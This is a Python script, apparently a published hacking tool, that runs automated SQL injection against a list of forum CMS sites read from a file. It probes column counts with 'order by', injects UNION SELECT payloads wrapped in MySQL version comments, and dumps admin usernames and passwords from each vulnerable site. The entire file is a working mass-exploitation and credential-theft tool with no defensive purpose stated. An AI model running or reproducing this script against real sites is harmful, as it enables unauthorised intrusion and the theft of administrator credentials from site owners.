import os, sys, requests
from bs4 import BeautifulSoup
from colorama import Fore

try:
  import requests
except ImportError:
  os.system("pip install requests")
  import requests
  
try:
  from bs4 import BeautifulSoup
except ImportError:
  os.system("pip install bs4")
  from bs4 import BeautifulSoup
  
print(Fore.RED+"_"*55)
print(Fore.GREEN+"Title: "+Fore.CYAN+"auto sql injection forum cms")
print(Fore.GREEN+"Author: "+Fore.CYAN+"jeager")
print(Fore.GREEN+"Team: "+Fore.CYAN+"ItsTeam Sec")
print(Fore.GREEN+"Youtube: "+Fore.CYAN+"youtube.com/c/learnwithjeager")
print(Fore.GREEN+"Instagram: "+Fore.CYAN+"instagram.com/learnwithjeager")
print(Fore.GREEN+"Github: "+Fore.CYAN+"github.com/learnwithjeager")
print(Fore.RED+"_"*55,"\n")


def payload(x):
  print(Fore.GREEN+"trying union select")
  payld = ', '.join([str(elem) for elem in x])
  req = requests.get(url+"' and 0 /*!50000union*/ /*!50000select*/ "+payld+" -- -")
  soup = BeautifulSoup(req.content, 'html.parser')
  page = soup.find_all('div', class_='card-body')
  
  for numS in page:
    numS2 = numS.find('h5')
    if None in (numS2,):
      continue
    elif numS2.text.strip() == "":
      break
    else:
      return numS2.text.strip()


def checkNum(i):
  check = True
  req = requests.get(url+"' order by "+i+" -- -")
  soup = BeautifulSoup(req.content, 'html.parser')
  page = soup.find_all('div', class_='card-body')
  
  for numS in page:
    numS2 = numS.find('h5')
    if None in (numS2,):
      continue
    elif numS2.text.strip() == "":
      check = False
      print(Fore.GREEN+"trying order by", i, Fore.RED+"False")
      break
    else:
      print(Fore.GREEN+"trying order by", i, Fore.BLUE+"True")
      
  return check
  
def sqli(url):
  x = []
  for i in range(0,100):
    i+=1
    check = checkNum(str(i))
    if check == False:
      break
    else:
      x.append(i)
  
  
  numU = payload(x)
  numD = int(numU) - 1
  print(Fore.GREEN+"found "+Fore.BLUE+numU+Fore.GREEN+" for dump database")
  x[numD] = "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,admin_username,0x203a3a20,admin_password,0x3c62723e))))x)"
  
  dump_payld = ', '.join([str(elem) for elem in x])
  reqD = requests.get(url+"' and 0 /*!50000union*/ /*!50000select*/ "+dump_payld+" -- -")
  soup = BeautifulSoup(reqD.content, 'html.parser')
  page = soup.find_all('div', class_='card-body')
  
  
  for numS in page:
    numS2 = numS.find('h5')
    if None in (numS2,):
      continue
    account = numS2.text.strip()
    print(Fore.YELLOW+"Url: "+Fore.CYAN+url)
    print(Fore.YELLOW+"Username: "+Fore.CYAN+account.split(' :: ')[0])
    print(Fore.YELLOW+"Password: "+Fore.CYAN+account.split(' :: ')[-1])
    print(Fore.WHITE)
    

if __name__ == "__main__":
  try:
    target = sys.argv[1]
  except:
    print(Fore.WHITE+"Usage: python sqli.py <target.txt>")
  
  for url in open(target, 'r').readlines():
    url = url.strip()
    try:
      sqli(url)
    except:
      print(Fore.WHITE+url+Fore.RED+" Not vuln!!")
      print(Fore.WHITE  )